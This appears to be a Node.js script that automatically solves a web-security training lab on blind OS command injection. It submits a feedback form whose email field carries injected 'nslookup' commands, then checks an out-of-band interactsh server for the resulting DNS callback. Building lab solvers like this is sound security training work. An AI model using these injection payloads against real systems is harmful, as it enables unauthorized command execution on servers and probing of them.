const { runLab, waitForSolved } = require('./_common.cjs');
const { makeMarker, pollForInteraction, requireInteractshDomain } = require('./_oob.cjs');

const TITLE = 'Blind OS command injection with out-of-band interaction';
const PATH = '/web-security/os-command-injection/lab-blind-out-of-band';

async function submitFeedback(page, labUrl, email) {
  await page.goto(`${labUrl}/feedback`, { waitUntil: 'domcontentloaded', timeout: 15000 });
  const csrf = await page.locator('[name="csrf"]').first().inputValue().catch(() => '');
  return page.evaluate(async ({ csrfToken, emailValue }) => {
    const body = new URLSearchParams();
    if (csrfToken) body.set('csrf', csrfToken);
    body.set('name', 'wiener');
    body.set('email', emailValue);
    body.set('subject', 'hello');
    body.set('message', 'hello');
    const response = await fetch('/feedback/submit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: body.toString(),
    });
    return response.status;
  }, { csrfToken: csrf, emailValue: email });
}

runLab({
  title: TITLE,
  path: PATH,
  solve: async ({ page, labUrl }) => {
    const domain = requireInteractshDomain();
    const marker = makeMarker('oscmd4');
    const payloads = [
      `x||nslookup+${marker}.${domain}||`,
      `x||nslookup ${marker}.${domain}||`,
      `x@x.com||nslookup+${marker}.${domain}||`,
    ];

    const since = Date.now();
    let statusCode = 0;
    let callback = null;
    let usedPayload = '';

    for (const payload of payloads) {
      // eslint-disable-next-line no-await-in-loop
      statusCode = await submitFeedback(page, labUrl, payload);
      // eslint-disable-next-line no-await-in-loop
      callback = await pollForInteraction({ marker, since, timeoutMs: 15000, stepMs: 2000 });
      if (callback) {
        usedPayload = payload;
        break;
      }
    }

    if (!callback) {
      throw new Error('No interactsh callback received for blind OS command injection');
    }

    const solved = await waitForSolved(page, labUrl, 90000, 5000);
    if (!solved) {
      throw new Error('Interactsh callback arrived, but the lab never marked as solved');
    }

    console.log(`RESULT_JSON:${JSON.stringify({ marker, payload: usedPayload, statusCode, callback: callback['full-id'] || callback['q-name'] || '' })}`);
  },
});
